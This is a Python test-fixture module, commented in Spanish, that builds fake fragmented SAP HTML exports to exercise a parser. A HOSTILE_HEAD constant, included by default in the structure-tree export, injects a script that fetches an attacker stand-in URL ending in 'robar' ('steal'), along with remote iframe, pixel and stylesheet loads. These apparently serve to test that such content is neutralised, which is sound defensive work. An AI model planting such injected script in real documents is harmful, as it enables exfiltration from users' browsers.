"""Export de SAP en su forma fragmentada, construido pieza a pieza.

Reproduce la **forma estructural** del export real y nada de su contenido:
todos los identificadores, descripciones y ubicaciones son inventados y se
reconocen a simple vista como tales (`MAT-FAKE-001`, `LOC-FAKE-001`).

La forma que reproduce, y que es lo que el parser tiene que soportar:

- ningún ``<table>``;
- un registro repartido en **varios** ``<nobr>``;
- ``<br>`` como frontera del registro;
- ``&nbsp;`` en abundancia, incluida la indentación;
- iconos ``<img>`` intercalados entre fragmentos;
- etiqueta y valor de metadata en fragmentos distintos;
- identificadores HTML arbitrarios que no significan nada.
"""

from typing import Any

__all__ = [
    "EQUIPMENT_CODE",
    "STRUCTURE_TREE_EXPORT",
    "TREE_EQUIPMENT_CODES",
    "TREE_LOCATION",
    "TREE_MATERIAL_CODES",
    "structure_tree_export",
    "tree_equipment_line",
    "tree_material_line",
    "tree_metadata_line",
    "tree_root_line",
    "FRAGMENTED_EXPORT",
    "LOCATION",
    "MATERIAL_CODES",
    "build_export",
    "equipment_line",
    "material_line",
    "metadata_lines",
]

LOCATION = "LOC-FAKE-001"
EQUIPMENT_CODE = "EQ-FAKE-001"
MATERIAL_CODES = ("MAT-FAKE-001", "MAT-FAKE-002")

# Espacio duro, tal como lo emite SAP.
NBSP = "&nbsp;"


def _indent(width: int) -> str:
    """Sangría hecha con espacio duro, como en el archivo real."""
    return f'<nobr id="i{width}">{NBSP * width}</nobr>'


def metadata_lines(
    *,
    location: str = LOCATION,
    description: str = "Conjunto ficticio",
    valid_from: str = "01.01.2026",
) -> str:
    """Cabecera con etiqueta y valor en fragmentos separados."""
    return (
        f'<nobr id="m1">Ubic.t&eacute;cn.</nobr><nobr id="m2">:</nobr>'
        f'<nobr id="m3">{location}</nobr><br>\n'
        f'<nobr id="m4">Denominaci&oacute;n</nobr>'
        f'<nobr id="m5">{NBSP * 2}{description}</nobr><br>\n'
        f'<nobr id="m6">V&aacute;lido de</nobr><nobr id="m7">{NBSP * 2}{valid_from}</nobr><br>\n'
    )


def equipment_line(
    code: str = EQUIPMENT_CODE,
    description: str = "Subconjunto ficticio",
    *,
    indent: int = 2,
    icon_attribute: str = "title",
    icon_value: str = "Equipo",
) -> str:
    """Un equipo hijo: icono entre fragmentos, sin cantidad ni unidad."""
    return (
        f"{_indent(indent)}"
        f'<img src="/sap/public/icono-ficticio-a.gif" {icon_attribute}="{icon_value}">'
        f'<nobr id="e1">{code}</nobr>'
        f'<nobr id="e2">{NBSP * 2}{description}</nobr><br>\n'
    )


def material_line(
    code: str,
    description: str,
    quantity: str,
    unit: str,
    *,
    indent: int = 4,
    icon_attribute: str = "title",
    icon_value: str = "Material",
) -> str:
    """Un material con **cada campo en su propio fragmento**."""
    return (
        f"{_indent(indent)}"
        f'<img src="/sap/public/icono-ficticio-b.gif" {icon_attribute}="{icon_value}">'
        f'<nobr id="f1">{code}</nobr>'
        f'<nobr id="f2">{NBSP * 2}{description}</nobr>'
        f'<nobr id="f3">{NBSP * 2}{quantity}</nobr>'
        f'<nobr id="f4">{NBSP * 2}{unit}</nobr><br>\n'
    )


def build_export(body: str, *, head: str = "", charset: str = "utf-8") -> bytes:
    """Envuelve el cuerpo en un documento completo."""
    document = (
        f'<html><head><meta charset="{charset}">{head}</head><body>'
        f'<font face="Courier New" size="2">\n{body}</font></body></html>'
    )
    return document.encode(charset)


def _default_body() -> str:
    return (
        metadata_lines()
        + f'<nobr id="blank">{NBSP}</nobr><br>\n'
        + equipment_line()
        + material_line(MATERIAL_CODES[0], "Repuesto ficticio A", "2", "UN")
        + material_line(MATERIAL_CODES[1], "Repuesto ficticio B", "10", "KG")
    )


FRAGMENTED_EXPORT: bytes = build_export(_default_body())


def export_with(**overrides: Any) -> bytes:
    """Export por defecto con el cuerpo sustituido."""
    body: str = overrides.get("body") or _default_body()
    return build_export(body)


# ---------------------------------------------------------------------
# Export completo con la forma del árbol de estructura
# ---------------------------------------------------------------------

TREE_LOCATION = "LOC-FAKE-100"
TREE_MATERIAL_CODES = ("FAKE0001", "90001234", "MAT-FAKE-200")
TREE_EQUIPMENT_CODES = ("EQ-FAKE-100", "EQ-FAKE-200")


def tree_metadata_line() -> str:
    """Dos parejas etiqueta/valor en un mismo renglón."""
    return (
        f'<nobr id="t1">Ubic.t&eacute;cn.</nobr><nobr id="t2">{NBSP * 2}</nobr>'
        f'<nobr id="t3">{TREE_LOCATION}</nobr><nobr id="t4">{NBSP * 2}</nobr>'
        f'<nobr id="t5">V&aacute;lido de</nobr><nobr id="t6">{NBSP * 2}</nobr>'
        f'<nobr id="t7">01.01.2026</nobr><br>\n'
    )


def tree_root_line() -> str:
    """La raíz del activo declara los dos tipos a la vez."""
    return (
        f'<nobr id="t8">{TREE_LOCATION}</nobr><nobr id="t9">{NBSP}ACTIVO FICTICIO</nobr>'
        '<img src="/sap/public/ficticio-a.gif" title="Material">'
        '<img src="/sap/public/ficticio-b.gif" title="Equipo"><br>\n'
    )


def tree_material_line(code: str, payload: str, *, dings: str = "0") -> str:
    """Un material **sin icono de material**, con el árbol y SAPDings delante.

    El identificador va en su propio fragmento y la descripción, el estado, la
    cantidad y la unidad comparten otro.
    """
    return (
        '<input type="checkbox">'
        f"<nobr>{NBSP * 2}</nobr><nobr>|---</nobr>"
        f'<font face="SAPDings"><nobr>{dings}</nobr></font>'
        f"<nobr>{NBSP}</nobr><nobr>{code}</nobr><nobr>{NBSP}{payload}</nobr><br>\n"
    )


def tree_equipment_line(code: str, description: str, *, attribute: str = "title") -> str:
    """Un equipo hijo con el icono **fuera** de los `<nobr>`."""
    return (
        f"<nobr>{NBSP * 2}</nobr><nobr>|---</nobr><nobr>{code}</nobr>"
        f"<nobr>{NBSP}{description}</nobr>"
        f'<img src="/sap/public/ficticio-b.gif" {attribute}="Equipo"><br>\n'
    )


HOSTILE_HEAD = (
    "<script>fetch('http://atacante.invalido/robar')</script>"
    '<iframe src="https://remoto.invalido/marco"></iframe>'
    '<img src="http://remoto.invalido/pixel.gif">'
    '<link rel="stylesheet" href="https://remoto.invalido/x.css">'
)


def structure_tree_export(*, hostile: bool = True) -> bytes:
    """Mini-export con la forma completa del árbol de estructura de SAP.

    Contiene, en este orden: metadata con dos campos en una línea, metadata en
    otra línea, una línea vacía, la raíz con los dos iconos, un conector, tres
    materiales sin icono y dos equipos con icono.
    """
    body = (
        (HOSTILE_HEAD if hostile else "")
        + tree_metadata_line()
        + "<nobr>Denominaci&oacute;n</nobr>"
        + f"<nobr>{NBSP * 2}</nobr><nobr>ACTIVO FICTICIO</nobr><br>\n"
        + f"<nobr>{NBSP}</nobr><br>\n"
        + tree_root_line()
        + f"<nobr>{NBSP * 2}</nobr><nobr>|</nobr><br>\n"
        + tree_material_line(
            TREE_MATERIAL_CODES[0],
            f"REPUESTO FICTICIO 123 ABC{NBSP * 3}L{NBSP * 4}8{NBSP * 2}UN",
        )
        + tree_material_line(
            TREE_MATERIAL_CODES[1],
            f"OTRO REPUESTO 500 W{NBSP * 3}28{NBSP * 2}PZA",
            dings="4",
        )
        + tree_material_line(
            TREE_MATERIAL_CODES[2],
            f"TERCER REPUESTO FICTICIO{NBSP * 3}1,5{NBSP * 2}KG",
        )
        + tree_equipment_line(TREE_EQUIPMENT_CODES[0], "EQUIPO FICTICIO PRIMARIO")
        + tree_equipment_line(
            TREE_EQUIPMENT_CODES[1], "EQUIPO FICTICIO SECUNDARIO", attribute="alt"
        )
    )
    return build_export(body)


STRUCTURE_TREE_EXPORT: bytes = structure_tree_export()
